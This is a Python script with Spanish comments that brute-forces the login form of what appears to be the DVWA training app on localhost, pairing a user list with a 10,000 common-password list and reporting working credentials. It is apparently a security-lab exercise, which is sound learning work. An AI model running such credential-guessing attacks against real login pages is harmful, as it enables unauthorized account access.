import requests
import time

# URL del formulario de autenticación
url = "http://localhost:8080/vulnerabilities/brute/"

# Definir las cabeceras HTTP a utilizar, incluyendo la cookie de sesión
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Referer": "http://localhost:8080/vulnerabilities/brute/",
    "Cookie": "PHPSESSID=0ccefgem17l0gtdp7lhie9oqq1; security=low"
}

# Lista para almacenar los pares de usuario/contraseña exitosos
successful_attempts = []

# Función que realiza un intento de inicio de sesión
def brute_force(username, password):
    # Parámetros que envía el formulario en el método GET
    params = {
        "username": username,
        "password": password,
        "Login": "Login"
    }
    
    # Realiza la solicitud GET
    response = requests.get(url, headers=headers, params=params)
    
    # Verificar si el intento fue exitoso (se busca una cadena en la respuesta)
    if "Welcome to the password protected area" in response.text:
        print(f"[SUCCESS] Usuario: {username} | Contraseña: {password}")
        successful_attempts.append((username, password))
        return True
    else:
        print(f"[FAILED] Usuario: {username} | Contraseña: {password}")
        return False

# Iniciar el contador de tiempo
start_time = time.time()

# Lista de usuarios y contraseñas para probar
with open('users.txt', 'r') as users_file, open('10k-most-common.txt', 'r') as passwords_file:
    users = [line.strip() for line in users_file]
    passwords = [line.strip() for line in passwords_file]

# Realizar el ataque de fuerza bruta probando combinaciones de usuarios y contraseñas
for user in users:
    for password in passwords:
        if brute_force(user, password):
            # Si encuentra una combinación válida, pasa al siguiente usuario
            break

# Calcular el tiempo total de ejecución
end_time = time.time()
execution_time = end_time - start_time

# Mostrar los pares exitosos y el tiempo total de ejecución
print("\n--- Resultados del ataque de fuerza bruta ---")
if successful_attempts:
    for username, password in successful_attempts:
        print(f"Usuario: {username} | Contraseña: {password}")
else:
    print("No se encontraron pares exitosos.")
    
print(f"\nTiempo total de ejecución: {execution_time:.2f} segundos")

